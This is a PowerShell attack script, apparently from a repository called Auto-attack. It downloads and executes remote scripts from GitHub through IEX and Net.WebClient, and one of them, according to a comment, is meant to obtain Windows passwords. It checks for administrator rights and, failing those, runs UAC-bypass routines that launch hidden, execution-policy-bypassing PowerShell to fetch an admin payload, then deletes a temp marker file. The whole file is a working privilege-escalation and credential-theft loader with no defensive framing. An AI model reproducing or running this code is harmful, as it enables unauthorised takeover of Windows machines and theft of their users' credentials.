#
#
#   Author: LZP
#
#
#
#
#
#start getInfo
$getInfo = "https://raw.githubusercontent.com/zp1in/Auto-attack/master/getInfo.ps1"
IEX(New-Object Net.WebClient).DownloadString($getInfo)

#try to get the windows pass
$admin = "https://raw.githubusercontent.com/zp1in/Auto-attack/master/admin.ps1"


function getTMPPATH{
    $AppData = $env:LOCALAPPDATA
    if (Test-Path($AppData + "\Temp")){
        return $AppData + "\Temp"    
    }
    else {
        return $AppData
    }
}

$TMP = getTMPPATH
if ([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")){
    #admin authority
    Write-Host "Admin user now, Starting Invoke admin Process"
    IEX(New-Object Net.WebClient).DownloadString($admin)
    
    


}
else{
    #not admin
    #trying to bypass UAC
    Write-Host "not Admin, Starting Bypass UAC"
    $BypassUAC = "https://raw.githubusercontent.com/zp1in/Auto-attack/master/PassUAC.ps1"
    $win7passUAC = "https://raw.githubusercontent.com/zp1in/Auto-attack/master/ScriptBypass.ps1"
    $isadmin = $TMP + '\chromeversion'
    $OSVersion = [Environment]::OSVersion.Version.Build


    if ($OSVersion -match "7600"){
        #win7  
        Write-Host "Win7 Found!"
        Write-Host "Starting BypassUAC with wscriptBypassUAC for Win7"     
        IEX(New-Object Net.WebClient).DownloadString($win7passUAC)
        Invoke-WScriptBypassUAC -payload "powershell.exe -ep Bypass -w hidden -nop -nologo   IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/zp1in/Auto-attack/master/admin.ps1')"
        sleep -Seconds 30
        if ((Get-Content $isadmin) -match '1'){Write-Host "Got System now"}
        else{
            Write-Host "Starting BypassUAC with BypassUAC "
            IEX(New-Object Net.WebClient).DownloadString($BypassUAC)
            Invoke-BypassUAC -Command "powershell.exe -ep bypass -nologo -nop IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/zp1in/Auto-attack/master/admin.ps1')"
            if ((Get-Content $isadmin) -match '1'){
                Write-Host "Got System now"
            }
        }

    }
    else{
        Write-Host "Starting BypassUAC with BypassUAC"
        IEX(New-Object Net.WebClient).DownloadString($BypassUAC)
        Invoke-BypassUAC -Command "powershell.exe -ep bypass -nologo -nop IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/zp1in/Auto-attack/master/admin.ps1')"
        sleep 30
        if ((Get-Content $isadmin) -match '1'){Write-Host "Got System now"}
    }
    sleep -Seconds 3
    Remove-Item -Path $isadmin
    Write-Host "Successful Removed tmpFile"
    #
    }
